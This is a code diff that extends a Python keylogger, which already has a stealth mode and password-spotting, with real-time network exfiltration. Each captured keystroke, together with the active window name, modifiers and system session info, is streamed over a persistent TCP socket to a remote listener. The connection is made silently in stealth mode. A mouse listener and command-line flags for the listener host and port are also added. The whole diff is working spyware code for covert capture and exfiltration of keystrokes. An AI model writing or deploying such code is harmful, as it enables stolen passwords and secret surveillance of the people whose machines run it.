@@ -8,7 +8,7 @@ The author is not responsible for any misuse of this software.
 ==============================
 """
 
-from pynput import keyboard
+from pynput import keyboard, mouse
 from datetime import datetime
 import os
 import platform
@@ -28,6 +28,13 @@ try:
 except ImportError:
     EMAIL_AVAILABLE = False
 
+# Import network transmitter if available
+try:
+    from network_transmitter import NetworkTransmitter
+    NETWORK_AVAILABLE = True
+except ImportError:
+    NETWORK_AVAILABLE = False
+
 
 class KeyLogger:
     """
@@ -35,7 +42,8 @@ class KeyLogger:
     """
 
     def __init__(self, log_dir="logs", max_file_size_kb=100, stealth_mode=False,
-                 enable_transmission=False, transmission_interval=30):
+                 enable_transmission=False, transmission_interval=30,
+                 enable_network=False, network_host=None, network_port=9999):
         self.log_buffer = []
         self.current_modifiers = set()
         self.start_time = datetime.now()
@@ -52,10 +60,25 @@ class KeyLogger:
         self.last_transmission = datetime.now()
         self.transmission_thread = None
         self.email_transmitter = None
+        self.network_transmitter = None
+
+        # Network transmission settings
+        self.enable_network = enable_network
+        self.network_host = network_host
+        self.network_port = network_port
+        self.network_socket = None  # Persistent connection
+        self.network_connected = False
+        
+        # Mouse listener for cursor position tracking
+        self.mouse_listener = None
 
         # Initialize email transmitter if enabled
         if self.enable_transmission and EMAIL_AVAILABLE:
             self._init_email_transmitter()
+
+        # Initialize network transmitter if enabled
+        if self.enable_network and NETWORK_AVAILABLE:
+            self._init_network_transmitter()
 
         # Stealth mode: secret key combination to stop (Ctrl+Shift+Esc)
         self.secret_stop_combination = {keyboard.Key.ctrl, keyboard.Key.shift, keyboard.Key.esc}
@@ -88,6 +111,8 @@ class KeyLogger:
         # Start transmission thread if enabled
         if self.enable_transmission and self.email_transmitter:
             self._start_transmission_thread()
+        elif self.enable_network and self.network_transmitter:
+            self._send_network_session_info()
 
     def _hide_console(self):
         """Hide the console window (Windows only)."""
@@ -415,6 +440,11 @@ Python Version: {platform.python_version()}
             # Check for file rotation
             self._check_file_rotation()
 
+            # Send individual keystroke to network in real-time if network transmission is enabled
+            if self.enable_network and self.network_connected:
+                key_value = str(key).replace("'", "")  # Clean up the key representation
+                self._send_keystroke_to_network(key_value, timestamp)
+
         except Exception as e:
             pass
 
@@ -450,6 +480,10 @@ Python Version: {platform.python_version()}
         # Save any remaining text
         if self.current_text_buffer.strip():
             self._save_text_entry()
+
+        # Disconnect persistent socket if active
+        if self.enable_network:
+            self._disconnect_persistent_socket()
 
         footer = f"""
 
@@ -546,6 +580,45 @@ Potential Passwords Found: {len(self.potential_passwords)}
             print(f"[ERROR] Failed to initialize email transmitter: {e}")
             self.enable_transmission = False
 
+    def _init_network_transmitter(self):
+        """Initialize the network transmitter with configuration from .env file."""
+        try:
+            if not all([self.network_host, self.network_port]):
+                print("[WARNING] Network configuration incomplete. Transmission disabled.")
+                self.enable_network = False
+                return
+
+            self.network_transmitter = NetworkTransmitter(
+                server_host=self.network_host,
+                server_port=self.network_port
+            )
+
+            # Test connection in normal mode
+            if not self.stealth_mode:
+                print("[INFO] Testing network connection...")
+                if self.network_transmitter.test_connection():
+                    print(f"[SUCCESS] Network transmission enabled. Target: {self.network_host}:{self.network_port}")
+                    # Establish persistent connection for real-time transmission
+                    print("[INFO] Establishing persistent connection...")
+                    if self._connect_persistent_socket():
+                        print("[SUCCESS] Persistent connection established. Ready for real-time transmission.")
+                    else:
+                        print("[WARNING] Failed to establish persistent connection.")
+                        self.enable_network = False
+                else:
+                    print("[WARNING] Network connection test failed. Is the listener server running?")
+                    self.enable_network = False
+            else:
+                # In stealth mode, silently try to connect
+                if self.network_transmitter.test_connection():
+                    self._connect_persistent_socket()
+                else:
+                    self.enable_network = False
+
+        except Exception as e:
+            print(f"[ERROR] Failed to initialize network transmitter: {e}")
+            self.enable_network = False
+
     def _start_transmission_thread(self):
         """Start a background thread for periodic transmission."""
         self.transmission_thread = threading.Thread(target=self._transmission_loop, daemon=True)
@@ -613,6 +686,129 @@ Potential Passwords Found: {len(self.potential_passwords)}
             if not self.stealth_mode:
                 print(f"[ERROR] Transmission error: {e}")
 
+    def _send_network_session_info(self):
+        """Send session information over the network."""
+        if not self.network_connected:
+            return
+
+        try:
+            session_data = {
+                'session_id': self.session_id,
+                'start_time': self.start_time.strftime('%Y-%m-%d %H:%M:%S'),
+                'system': platform.system(),
+                'machine': platform.machine(),
+                'release': platform.release()
+            }
+
+            message = {
+                'type': 'session_info',
+                'timestamp': datetime.now().isoformat(),
+                'data': session_data
+            }
+
+            self._send_via_persistent_socket(message)
+
+            if not self.stealth_mode:
+                print(f"[INFO] Network session info sent to {self.network_host}:{self.network_port}")
+
+        except Exception:
+            pass
+
+    def _send_keystroke_to_network(self, key_value, timestamp):
+        """Send a single keystroke to the network in real-time via persistent connection."""
+        if not self.network_connected:
+            return
+
+        try:
+            keystroke_data = {
+                'key': key_value,
+                'window': self.current_window,
+                'timestamp': timestamp,
+                'modifiers': list(self.current_modifiers) if self.current_modifiers else []
+            }
+
+            message = {
+                'type': 'keystroke',
+                'timestamp': datetime.now().isoformat(),
+                'data': keystroke_data
+            }
+
+            self._send_via_persistent_socket(message)
+        except Exception:
+            # If connection fails, try to reconnect
+            if not self._connect_persistent_socket():
+                self.network_connected = False
+
+    def _send_via_persistent_socket(self, message):
+        """Send a message via the persistent socket connection."""
+        try:
+            import json
+            data = json.dumps(message).encode('utf-8')
+            data_size = len(data).to_bytes(4, byteorder='big')
+
+            self.network_socket.sendall(data_size)
+            self.network_socket.sendall(data)
+
+            # Wait for acknowledgment
+            response = self.network_socket.recv(1024).decode('utf-8')
+            return response == 'OK'
+        except Exception:
+            self.network_connected = False
+            return False
+
+    def _connect_persistent_socket(self):
+        """Establish a persistent socket connection to the network server."""
+        try:
+            import socket
+            self.network_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.network_socket.settimeout(5)
+            self.network_socket.connect((self.network_host, self.network_port))
+            self.network_connected = True
+            return True
+        except Exception:
+            self.network_connected = False
+            if self.network_socket:
+                try:
+                    self.network_socket.close()
+                except:
+                    pass
+                self.network_socket = None
+            return False
+
+    def _disconnect_persistent_socket(self):
+        """Close the persistent socket connection."""
+        if self.network_socket:
+            try:
+                # Send disconnect message
+                disconnect_message = {
+                    'type': 'disconnect',
+                    'timestamp': datetime.now().isoformat(),
+                    'data': {'session_id': self.session_id}
+                }
+                self._send_via_persistent_socket(disconnect_message)
+
+                # Close the socket
+                self.network_socket.close()
+            except:
+                pass
+            finally:
+                self.network_socket = None
+                self.network_connected = False
+
+    def on_mouse_click(self, x, y, button, pressed):
+        """
+        Callback function when a mouse click is detected.
+        Stops the listener on left click, can be used to detect cursor position.
+        """
+        try:
+            if pressed:
+                # Stop the listener on left click (for stealth termination)
+                self._write_to_file(f"\n\n[MOUSE CLICK DETECTED - POSSIBLE STEALTH TERMINATION]\n")
+                self._write_session_footer()
+                return False
+        except Exception:
+            pass
+
     def start(self):
         """
         Start the keylogger listener.
@@ -634,12 +830,29 @@ Potential Passwords Found: {len(self.potential_passwords)}
             print("="*60)
             print("\nCapturing keystrokes:\n")
 
+        # Start mouse listener if network transmission is enabled
+        if self.enable_network and self.network_connected:
+            self.mouse_listener = mouse.Listener(on_click=self.on_mouse_click)
+            self.mouse_listener.start()
+            if not self.stealth_mode:
+                print("[INFO] Mouse tracking enabled for cursor position detection")
+
         # Start listening to keyboard events
-        with keyboard.Listener(
-            on_press=self.on_press,
-            on_release=self.on_release
-        ) as listener:
-            listener.join()
+        try:
+            with keyboard.Listener(
+                on_press=self.on_press,
+                on_release=self.on_release
+            ) as listener:
+                listener.join()
+        except KeyboardInterrupt:
+            # Handle Ctrl+C gracefully
+            self._write_session_footer()
+            if not self.stealth_mode:
+                print("\n\n[KEYLOGGER STOPPED BY INTERRUPT]")
+        finally:
+            # Stop mouse listener if it was started
+            if self.mouse_listener:
+                self.mouse_listener.stop()
 
         if not self.stealth_mode:
             print(f"\n\nStopped at: {self.get_timestamp()}")
@@ -690,6 +903,25 @@ def parse_arguments():
         help='Transmission interval in minutes (default: 30)'
     )
 
+    parser.add_argument(
+        '-n', '--network',
+        action='store_true',
+        help='Enable network transmission to listener server'
+    )
+
+    parser.add_argument(
+        '-H', '--host',
+        type=str,
+        help='Listener server host/IP address (required with --network)'
+    )
+
+    parser.add_argument(
+        '-p', '--port',
+        type=int,
+        default=9999,
+        help='Listener server port (default: 9999)'
+    )
+
     return parser.parse_args()
 
 
@@ -709,7 +941,10 @@ def main():
         max_file_size_kb=args.max_size,
         stealth_mode=args.stealth,
         enable_transmission=args.transmit,
-        transmission_interval=args.interval
+        transmission_interval=args.interval,
+        enable_network=args.network,
+        network_host=args.host,
+        network_port=args.port
     )
     keylogger.start()
 
